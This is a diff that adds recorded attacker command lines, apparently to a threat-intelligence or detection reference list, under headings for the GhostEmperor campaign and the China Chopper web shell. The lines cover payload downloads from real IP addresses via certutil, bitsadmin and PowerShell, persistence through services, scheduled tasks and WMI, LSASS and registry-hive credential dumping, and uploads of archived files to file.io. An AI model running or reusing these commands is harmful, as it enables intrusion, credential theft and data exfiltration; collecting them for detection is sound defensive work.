@@ -381,5 +381,108 @@ attrib -s -h %userprofile%\documents\Default.rdp
 del %userprofile%\documents\Default.rdp
 del /f /s /q /a %AppData%\Microsoft\Windows\Recent\AutomaticDestinations
 
+# GhostEmperor
+cmd.exe /c certutil -urlcache -split -f http://8.210.141.104:8099/MEUpdate.exe C:\Windows\Help\Help\MEUpdate.exe
+sc.exe create "server power" binpath="C:\Windows\system32\cmd.exe /c start C:\Windows\Help\help\MEUpdate.exe"
+sc.exe start "server power"
+
+quser.exe whoami
+quser.exe quser
+net.exe time /do
+tasklist.exe /svc
+cmd.exe" /c netstat -ano"
+ipconfig.exe /all
+cmd.exe /C systeminfo
+cmd.exe /C net view \\
+cmd.exe /c dir $appdata
+cmd.exe /C dir "$programfiles\Kaspersky Lab\Kaspersky Endpoint Security for Windows\version.txt"
+cmd.exe /C type "$programfiles\Kaspersky Lab\Kaspersky Endpoint Security for Windows\version.txt"
+cmd.exe /C net group "domain admins" /
+cmd.exe /C net group /do
+ping.exe -n 1 -a 10.1.2.98
+cmd.exe /C type \\
+\SYSVOL
+\Policies\{C9289F9A-2A89-
+}\Machine\Preferences\ScheduledTasks\ScheduledTasks.xml
+cmd.exe /C type \\
+\sysvol\run.bat
+
+$windir\Help\Help\DumpMinitool.exe --file 1.txt --processId 
+--dumpType Full
+cmd.exe /C DumpMinitool.exe --file 1.txt --processId 
+
+$windir\Help\Help\ssp.exe $windir\Help\Help\DII7.dll
+$windir\help\help\duplicatedump.exe -f test -c $windir\Help\Help\LSAPlugin.dll
+$windir\Help\Help\new.exe C:\Windows\help\help\dll7.dll
+
+cmd.exe /C findstr /s /i "cpassword" \\
+\sysvol\*.xml
+cmd.exe /c bitsadmin /transfer n http://8.210.141.104:8099/1.txt $public\Downloads\1.txt
+cmd.exe /c PowerShell iwr -Uri http://8.210.141.104:8099/1.txt -OutFile c:\1.txt -UseBasicParsing
+$windir\Help\Help\7z.exe a $windir\Help\Help\tg.7z $windir\Help\Help\1.rar
+curl.exe -F "file=@$windir\help\help\1.rar" --ssl-no-revoke https://file.io
+
+# China Chopper
+cmd /c cd "C:\inetpub\wwwroot\aspnet_client"&whoami&echo
+$hklm\system\controlset001\services\hixnjvod
+C:\Windows\system32\cmd.exe /b /c start /b /min PowerShell.exe -nop -w hidden -noni -c "if([IntPtr]::Size -eq 4){$b=$env:windir+'\sysnative\WindowsPowerShell\v1.0\PowerShell.exe'}else{$b='PowerShell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-noni -nop -w hidden -c &([scriptblock]::create((New-Object System.IO.StreamReader(New-Object System.IO.Compression.GzipStream((New-Object System.IO.MemoryStream(,[System.Convert]::FromBase64String("
+')))).[System.IO.Compression.CompressionMode]::Decompress))).ReadToEnd()))';
+$s.UseShellExecute=$false;$s.RedirectStandardOutput=$true;
+$s=WindowStyle='Hidden';$s.CreateNoWindow=$true;$p=[System.Diagnostics.Process]::Start($s);"
+
+$system32\cmd.exe /c certutil.exe -urlcache -split -f http://116.206.92.26:82/update.exe && update.exe && certutil.exe -urlcache -split -f http://116.206.92.26:82/update.exe delete
+
+instance of __EventFilter {
+    EventNamespace = "root\\cimv2";
+    Name = "Chrome Update";
+    Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >=240 AND TargetInstance.SystemUpTime < 325";
+    QueryLanguage = "WQL"; };
+
+instance of CommandLineEventConsumer {
+    ExecutablePath = "C:\\Windows\\System32\\GoogleUpdate.exe";
+    Name = "GoogleUpdate";
+};
+
+PowerShell "Start-BitsTransfer -Source http://security.lomiasecure.net/crx/node.txt -Destination C:\\Users\\public\\node.txt -transfertype download"
+PowerShell if($InputString = Get-Content 'C:\\users\\public\\node.txt'){
+[System.IO.File]::WriteAllBytes('C:\\users\\public\\node.exe',
+[System.Convert]::FromBase64String($InputString))}
+
+attrib +s crml.exe
+schtasks /Create /Tn \Microsoft\Windows\Registration\CRMLog /sc daily /st 11:50 /tr "C:\Windows\Registration\crml.exe" /ru system /f
+schtasks /run /Tn \Microsoft\Windows\Registration\CRMLog
+
+$system32\cmd.exe /c bitsadmin /transfer n https://raw.githubusercontent.com/tellyou123/1/master/aro.dat $temp\aro.dat > C:\inetpub\wwwroot\aspnet_client\1.txt
+
+cmd.exe /C arp -a >
+$temp\gGjrlFGa.tmp 2>&1
+netstat.exe user
+ping.exe 8.8.8.8
+ping.exe google.com
+ping.exe 167.179.64.62
+
+cmd.exe /C xcopy /s $user\desktop c:\$recycle\bin\temp\
+cmd.exe /C xcopy /s $user\downloads c:\$recycle\bin\temp\
+cmd.exe /C $programdata\winrar\rar.exe a -r -hp1234 C:$recycle.bin\10020111desk.rar $user\desktop\*.txt $user\desktop\*.xls* $user\desktop\*.pdf $user\desktop\*.doc* $user\desktop\*.jpg > $temp\lwefqERM.tmp 2>&1
+C:\Windows\System32\reg.exe save hklm\sam sam.hive
+errorreport.exe -ma lsass.exe l.dmp
+net use \\
+/u:
+
+cmd /c mkdir C:\Windows\temp\debugsms
+cmd /c reg save hklm\sam C:\Windows\temp\debugsms\sam
+cmd /c reg save hklm\system C:\Windows\temp\debugsms\system
+cmd /c reg save hklm\security C:\Windows\temp\debugsms\security
+cmd /c choice /t 1 /d y /n >nul
+cmd /c ipconfig /all > C:\Windows\temp\debugsms\ip.txt
+cmd /c arp -a > C:\Windows\temp\debugsms\arp.txt
+cmd /c dir /b /s C:\Windows\temp\debugsms\ > C:\Windows\temp\siineidvsms.log
+cmd /c makecab /f C:\Windows\temp ssineidvsms.log /d compressiontype=lzx /d compressionmemory=21 /d maxdisksize=10240000000 /d diskdirectorytemplate="C:\Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth" /d cabinetnametemplate=iisstop.png
+cmd /c start C:\Windows\temp\TMP23876.bat
+cmd /c rmdir /s /q C:\Windows\temp\debugsms
+
+cmd /c C:\Windows\system32\WindowsPowerShell\v1.0\PowerShell.EXE -c "$ctnt=Get-Content $temp\Err_36d96944_6318.log;PowerShell -enc $ctnt;
+
+
 # Do not remove the line
 
